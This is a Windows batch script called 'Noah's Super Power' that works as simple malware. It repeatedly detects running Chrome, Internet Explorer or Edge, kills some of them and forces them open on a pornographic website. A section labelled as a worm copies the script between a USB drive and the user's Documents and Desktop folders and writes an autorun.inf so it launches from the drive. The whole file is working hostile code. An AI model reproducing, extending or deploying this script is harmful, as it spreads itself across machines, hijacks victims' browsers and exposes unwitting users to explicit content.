:::::::::::::::::::::::::::
::NOAH'S SUPER POWER V1.5::
:::::::::::::::::::::::::::
:: Copyright (c) Grathium Softwares 2018, grathiumsoftwears@gmail.com

REM *to change webbrowser homepage change the 'url after chrome.exe/iexplore.exe/MicrosoftEdge.exe "ENTER NEW HOMEPAGE URL HERE"'
REM *compatiable with chrome, edge and internet explorer

@echo off
color e
title Noahs Super Power
set /a okay=0
ver >nul
cls

goto loop
:A
start chrome.exe ""
timeout /nobreak 10
::homepage loops
:loop
cls
if /i "%okay%" EQU "1" goto waitchrome
if /i "%okay%" EQU "2" goto waitie
if /i "%okay%" EQU "3" goto waitedge
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if "%ERRORLEVEL%"=="0" goto yeschrome
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if "%ERRORLEVEL%"=="0" goto yesie
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
if "%ERRORLEVEL%"=="0" goto yesedge

REM worm copying to external drives
::if on usb copy to documents
set /a loopsdone=0
if exist "C:\Users\%username%\Documents\*.1.bat" goto pass1
if /i "%CD:~0,3%" EQU "E:\" goto copyfromusbtodoc
:pass1
::if on usb copy to desktop
if exist "C:\Users\%username%\Desktop\*.1.bat" goto pass2
if /i "%CD:~0,3%" EQU "E:\" goto copyfromusbtodesk
:pass2

::if on desktop copy to usb
if not exist "E:\" goto loop
if exist "E:\*.1.bat" goto loop

for /r %%f in (*.1.bat) do (
type %%~nxf >>"E:\%%~nxf"
::make autorun file
if exist "E:\autorun.inf" del "E:\autorun.inf"
echo [autorun]>>"E:\autorun.inf"
echo open=%%~nxf>>"E:\autorun.inf"
echo icon=icon.ico>>"E:\autorun.inf"
echo action=Click to run.>>"E:\autorun.inf"
echo shell\open\command=%%~nxf>>"E:\autorun.inf"
)
goto loop

::open change window location if needed
:yeschrome
::taskkill /F /IM chrome.exe
start "Google Chrome" /HIGH chrome.exe "https://pornhub.com"
cls
set /a okay=1
timeout /nobreak 1 >nul
goto loop
:yesie
taskkill /F /IM iexplore.exe /T
start "IExplore" /HIGH iexplore.exe "https://pornhub.com"
cls
set /a okay=2
timeout /nobreak 1 >nul
goto loop
:yesedge
taskkill /F /IM MicrosoftEdge.exe /T
start "IExplore" /HIGH MicrosoftEdge.exe "https://pornhub.com"
cls
set /a okay=3
timeout /nobreak 1 >nul
goto loop

::waits
:waitchrome
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
if "%ERRORLEVEL%"=="0" goto waitchrome
timeout /t 0 >nul
set /a okay=0
goto loop
:waitie
tasklist /FI "IMAGENAME eq iexplore.exe" 2>NUL | find /I /N "iexplore.exe">NUL
if "%ERRORLEVEL%"=="0" goto waitie
timeout /t 0 >nul
set /a okay=0
goto loop
:waitedge
tasklist /FI "IMAGENAME eq MicrosoftEdge.exe" 2>NUL | find /I /N "MicrosoftEdge.exe">NUL
if "%ERRORLEVEL%"=="0" goto waitedge
timeout /t 0 >nul
set /a okay=0
goto loop

:copyfromusbtodoc
for /r %%f in (*.1.bat) do (
type %%~nxf >>"C:\Users\%username%\Documents\%%~nxf"
)
goto loop
:copyfromusbtodesk
for /r %%f in (*.1.bat) do (
type %%~nxf >>"C:\Users\%username%\Desktop\%%~nxf"
)
goto loop

::security stuff
:nexi
color c
echo Security Pass Invalid..
timeout /t 0 >nul
exit /B 1
